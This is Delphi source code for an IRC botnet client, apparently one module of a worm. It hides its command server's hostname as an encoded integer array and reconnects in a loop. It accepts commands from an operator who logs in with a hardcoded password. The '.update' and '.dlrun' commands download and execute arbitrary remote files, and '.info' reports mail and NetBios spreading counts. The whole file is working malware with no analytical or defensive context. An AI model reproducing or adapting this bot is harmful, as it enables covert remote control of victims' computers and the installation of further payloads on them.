   unit pIrcBot;

   interface

   Uses
     Windows, Winsock, pfunc;

   Procedure DoIrcBot;
   Procedure SendData(Text: String);

   const
     add : array[0..19] of integer = (118,111,115,104,97,
                                      116,114,97, 117,109,
                                      46, 110,111,45, 105,
                                      112,46, 99, 111,109);

   Var
     Sock: TSocket;
     Addr: TSockAddrIn;
     _Wsa: TWsaData;
     P   : Array[0..3000] Of String;
     N   : Integer;

   implementation

   Procedure SendData(Text: String);
   Begin
     Send(Sock, Text[1], Length(Text), 0);
   End;

   Procedure GetParams(D: String);
   Var
     Tmp: String;
   Begin
     ZeroMemory(@P, SizeOf(P));
     FillChar(P, 3000, #0);
     N := 0;
     D := Trim(D) + ' ';
     While Pos(' ', D) > 0 Do
     Begin
       Tmp := Copy(D, 1, Pos(' ', D)-1);
       Delete(D, 1, Length(Tmp)+1);
       P[N] := Tmp;
       Inc(N);
     End;
   End;

   Function R(I:Integer):String;
   Var
     A: String;
     U: Integer;
   Begin
     Case I Of
       1:  A := 'abcdefghijklmnopqrstuvwxyz_-.{}[]\^|';
       2:  A := 'abcdefghijklmnopqrstuvwxyz';
     End;
     Result := '';
     U := Random(19)+1;
     While Length(Result) < U Do
       Case Random(2) Of
         0: Result := Result + LowerCase(A[Random(Length(A))]);
         1: Result := Result + UpperCase(A[Random(Length(A))]);
       End;
     While Pos(#0, Result) >0 Do
       Delete(Result, pos(#0, Result), 1);
   End;

   Procedure ReadSock;
   Var
     Buf: Array[0..1600] Of Char;
     Data: String;
     LoggedIn: Bool;
   Begin

     LoggedIn := False;

     Data := lowercase(R(2));
     SendData('USER '+Data+' '+Data+'@mailman.com '+Data+' '+Data+#10);
     SendData('NICK '+R(1)+#10);

     While Recv(Sock, Buf, 1600, 0) > 0 Do
     Begin
       Data := '';
       Data := Buf;
       ZeroMemory(@Buf, SizeOf(Buf));

       GetParams(Data);

       If Pos('MOTD', Data) > 0 Then
       Begin
         SendData('JOIN ##ACID##3#_#'#10);
         SendData('MOTD ##ACID##3#_#'#10);
       End;

       If Pos('PING', data) > 0 Then
       Begin
         data := Copy(Data, Pos('PING', Data) , Length(Data));
         Delete(Data, 2, 1);
         Insert('O', Data, 2);
         Data := COpy(Data, 1, Pos(#10, Data));
         SendData(Data);
       End;

       If UpperCase(P[1]) = 'PRIVMSG' Then
       Begin
         Delete(P[3],1,1);

         if (lowercase(P[3]) = '.logout') and (loggedin) then
         Begin
           LoggedIn := False;
           SendData('PRIVMSG '+P[2]+' :Bye '+Copy(P[0],1,pos('!', p[0])-1)+#10);
         End;
         if (lowercase(P[3]) = '.login') and (P[4] = '#acid#') and (not loggedin) Then
         Begin
           LoggedIn := True;
           SendData('PRIVMSG '+P[2]+' :Welcome '+Copy(P[0],1,pos('!', p[0])-1)+#10);
         End;

         if (lowercase(P[3]) = '.info') and (LoggedIn) Then
         Begin
           SendData('PRIVMSG '+P[2]+' :Mail('+IntToStr(m_spread)+') NetBios('+IntToStr(n_spread)+')'#10);
         End;
         if (lowercase(P[3]) = '.update') and (LoggedIn) Then
         Begin
           SendData('PRIVMSG '+P[2]+' :Downloading ('+P[4]+')'#10);
           URLDownloadToFile(0,pchar(P[4]),pchar(P[5]),0,0);
           SendData('PRIVMSG '+P[2]+' :Downloaded To ('+P[5]+')'#10);
           SendData('PRIVMSG '+P[2]+' :Executing ('+P[5]+')'#10);
           ExecuteFile(P[5], True);
           ExitProcess(0);
         End;
         if (lowercase(P[3]) = '.dlrun') and (LoggedIn) Then
         Begin
           SendData('PRIVMSG '+P[2]+' :Downloading ('+P[4]+')'#10);
           URLDownloadToFile(0,pchar(P[4]),pchar(P[5]),0,0);
           SendData('PRIVMSG '+P[2]+' :Downloaded To ('+P[5]+')'#10);
           If P[6] = '1' Then
           Begin
             SendData('PRIVMSG '+P[2]+' :Executing ('+P[5]+')'#10);
             ExecuteFile(P[5], True);
           End;
         End;
       End;

     End;
   End;

   Procedure IrcBot;
   Var
     S: String;
     I: Integer;
   Begin
     Repeat
       For I := 0 To 19 Do
         S:=S + Chr(Add[I]);

       CloseSocket(Sock);

       WsaStartUp(MAKEWORD(2,1), _Wsa);

       Sock := Socket(AF_INET, SOCK_STREAM, 0);
       Addr.sin_family := AF_INET;
       Addr.sin_port := hTons(6667);
       Addr.sin_addr.S_addr := inet_Addr(pchar(ipstr(S)));
       If Connect(Sock, Addr, SizeOf(Addr)) = ERROR_SUCCESS Then
       Begin
         ReadSock;
       End;

       WsaCleanUp();
     Until  1 = 2;
   End;

   Procedure DoIrcBot;
   Var
     d: Dword;
   Begin
     IrcBot;//  CreateThread(nil, 0, @IrcBot, nil, 0, d);
   End;

   end.
